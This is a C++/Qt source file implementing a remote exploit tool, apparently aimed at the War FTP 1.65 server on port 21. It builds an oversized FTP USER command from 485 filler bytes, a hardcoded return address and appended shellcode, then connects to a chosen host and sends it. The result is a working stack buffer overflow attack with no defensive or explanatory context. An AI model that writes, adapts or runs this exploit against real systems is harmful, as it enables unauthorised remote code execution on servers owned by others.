
#include "ward165exp.h"
#include <cstdlib>
#include <cstdio>
#include <cstring>


ward165exp::ward165exp() : port(21), exp_data(nullptr)
{
}

void ward165exp::set_host(const QString &host_name)
{
    this->host_name = host_name;
}

void ward165exp::set_port(quint16 port)
{
    this->port = port;
}

void ward165exp::make_exp_data(const char *custom)
{
    delete exp_data;
    exp_data = new char[4096];
    if (custom != nullptr) {
        sprintf(exp_data, "USER %s\r\n", custom);
        return;
    }
    //else
    char *tmp_str = new char[1024];
    memset(tmp_str, 'A', 485);
    tmp_str[485] = 0x12;
    tmp_str[486] = 0x45;
    tmp_str[487] = 0xfa;
    tmp_str[488] = 0x7f;

    for (int i=489;i<493;i++) {
            tmp_str[i] = 'B';
    }
    memcpy(tmp_str+493, shellcode, strlen(shellcode));
    tmp_str[493+strlen(shellcode)] = '\0';
    sprintf(exp_data, "USER %s\r\n", tmp_str);

    delete tmp_str;
}


void ward165exp::do_exploit(const char *custom)
{
    static char buf[4096];
    emit new_result(QString(tr("Connecting to host: ")).append(host_name).append(tr(" port: ")).append(QString::number(port)));

    int sockfd;
    struct sockaddr_in server_addr;

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        emit new_result(tr("Failed to create socket!"));
        return;
    }
    bzero(&server_addr, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_aton(host_name.toStdString().data(), &server_addr.sin_addr) == 0) {
        emit new_result(tr("Server IP Error!"));
        return;
    }
    if (::connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        emit new_result(tr("Failed to connect with server!"));
        return;
    }
    recv(sockfd, buf, sizeof(buf), 0);
    emit new_result(QString::fromLatin1(buf));
    make_exp_data(custom);
    emit new_result(tr("Sending Exploit..."));
    send(sockfd, exp_data, strlen(exp_data), 0);
    emit new_result(tr("Done."));
    shutdown(sockfd, 2);
}

ward165exp::~ward165exp()
{
    delete exp_data;
}



